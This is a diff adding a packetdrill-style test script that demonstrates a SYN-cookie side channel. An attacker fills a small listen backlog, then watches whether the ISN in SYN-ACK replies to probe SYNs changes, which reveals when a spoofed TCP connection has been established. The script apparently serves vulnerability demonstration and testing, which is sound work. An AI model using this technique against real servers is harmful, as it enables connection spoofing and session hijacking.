@@ -1,0 +1,95 @@
+// use "sudo tcpdump -i any -n port 8080 -B 5000" to check the full dialog.
+// or use "sudo tcpdump -i any -n port 20000 -B 5000" if you only want to check
+// the side channel acknowledgment.
+
+// ------------Initialize server socket ---------- //
+
+0 socket(...,SOCK_STREAM,IPPROTO_TCP)=3
++0 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
++0 bind(3,...,...)=0
+
+// to demostrate the problem, we only use a backlog of length 2
++0 listen(3,2)=0
+
+// ----------------------------------------------- //
+
+
+
+
+// ------------Padding backlog queue ------------- //
+
+// In the beginning, the attacker sends 2 SYN packets to fill
+// the request backlog queue. Thus, SYN cookies will be used 
+// for future connection requests.
+
+// conn request 1 (the connection attacker tries to spoof)
+// For this connection request, we didn't specify a fixed 
+// source port, because 
+// "+0 > fixed_port >8080 S. 0:0(0) ack 1 <...>" and
+// "+0 < fixed_port >8080 . 1:1(0) ack 1 <...>"
+// are not working properly
++0 < S 0:0(0) win 65535 <mss 1000>
++0 > S. 0:0(0) ack 1 <...>
+
+//conn request 2 (a padding connection to fill backlog queue)
++0 < 12346 > 8080 S 0:0(0) win 65535 <mss 1000>
+
+// ----------------------------------------------- //
+
+
+
+// ------------ Probing and Bruteforce ----------- //
+
+// According to the SYN-Cookie algorithm, for SYN requests
+// from the same source address, the ISN remains same in a
+// one minute time frame.
+// As long as the backlog queue is still full, two subsequent
+// SYN probes from the same source address would have the same
+// ISN number in the received SYN-ACK response.
+// While if the backlog queue is not full (the attacker successfully
+// spoofed a connection), as SYN cookie algorithm is no longer
+// used to generate ISN, two subsequent SYN probes will show different
+// ISN number in the received SYN-ACK responses.
+// Thus the change of ISN in SYN-ACK responses to SYN probe acknowledge
+// successful spoofing to the attacker.
+
+// probe 1 (queue is full, SYN-cookie ISN is used)
++0 < 20000 > 8080 S 0:0(0) win 65535 <mss 1000>
++0 < 20000 > 8080 R 1:1(0) win 65535 <mss 1000>
+
+// The attacker tries to establish connection request 1.
+// However, this time, an ACK packet with mismatch ack number is sent.
+// Thus, connection is not established, and backlog queue remains full.
+// False attempt to finish conn request 1
++0 < . 1:1(0) ack 2 win 65535 <mss 1000>
+
+// Since the backlog queue remains full, the ISN in SYN-ACK response to
+// probe 2 should be the same for the ISN in SYN-ACK response to probe 1
+
+//probe 2 (queue is full, SYN-cookie ISN is used)
++0 < 20000 > 8080 S 0:0(0) win 65535 <mss 1000>
++0 < 20000 > 8080 R 1:1(0) win 65535 <mss 1000>
+
+// The attacker tries to establish connection request 1.
+// This time, an ACK packet with correct ack number is sent.
+// Thus connection is established, and the backlog queue is not full now.
+// true attempt to finish conn request 1
++0 < . 1:1(0) ack 1 win 65535 <mss 1000>
++0 accept(3, ..., ...)=4
+
+// Since the backlog queue is not full, the ISN in SYN-ACK response to probe 3
+// should be different from the ISN in SYN-ACK response to probe 1&2
+
+//probe 3 (queue is not full, non SYN-Cookie ISN is used)
++0 < 20000 > 8080 S 0:0(0) win 65535 <mss 1000>
++0 < 20000 > 8080 R 1:1(0) win 65535 <mss 1000>
+
+// probe 4 (queue is not full, non SYN-Cookie ISN is used)
++0 < 20000 > 8080 S 0:0(0) win 65535 <mss 1000>
++0 < 20000 > 8080 R 1:1(0) win 65535 <mss 1000>
+
+// ------------------------------------------------- //
+
+
++0 close(4)=0
++0 < 12346 > 8080 R 1:1(0) win 65535 <mss 1000>
